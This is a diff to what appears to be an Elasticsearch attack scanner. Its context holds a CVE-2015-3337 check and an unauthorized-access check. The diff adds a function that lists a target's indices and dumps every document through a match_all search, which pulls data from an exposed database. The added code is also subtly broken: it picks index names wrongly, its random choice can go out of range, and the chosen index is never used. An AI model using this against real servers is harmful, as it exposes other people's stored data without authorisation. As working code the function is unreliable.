@@ -98,7 +98,16 @@ def cve_2015_3337_rce_check(ip, port=9200, timeout=5):
     else:
         print('[-] Elasticsearch: 未找到漏洞 cve-2015-3337!')
         return False
-
+def viewdoc(ip, port=9200, timeout=5):
+    url="http://{}:{}/_cat/indices".format(ip,str(port))
+    print(url)
+    indices = requests.get(url)
+    indices = [line[2] for line in indices.content.decode().split("\n") if line]
+    indice = indices[random.randint(0, len(indices))]
+    data ={  "query": { "match_all": {} },  "sort": [    { "_id": "asc" }  ]}
+    resp=requests.post("http://{}:{}/_search".format(ip,str(port)),json=data)
+    print(resp.content.decode())
+    
 
 if __name__ == '__main__':
     Unauthorized_check(TARGET_IP, TARGET_PORT)
